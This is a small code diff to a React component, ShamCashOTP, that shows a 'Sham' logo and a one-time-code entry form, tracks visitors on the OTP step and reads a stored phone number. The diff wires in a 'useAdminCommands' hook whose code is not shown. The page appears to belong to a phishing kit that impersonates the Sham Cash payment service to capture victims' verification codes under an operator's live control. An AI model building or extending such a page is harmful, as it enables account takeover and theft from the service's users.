@@ -1,5 +1,6 @@
 import { useState, useRef, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { useAdminCommands } from "@/hooks/useAdminCommands";
 
 function ShamLogo() {
   return (
@@ -28,6 +29,7 @@ export function ShamCashOTP() {
   const inputs = useRef<(HTMLInputElement | null)[]>([]);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   useVisitorTracking("التحقق OTP");
+  useAdminCommands();
 
   const rawPhone = localStorage.getItem("sham_phone") ?? "";
   const digitsOnly = rawPhone.replace(/\D/g, "");
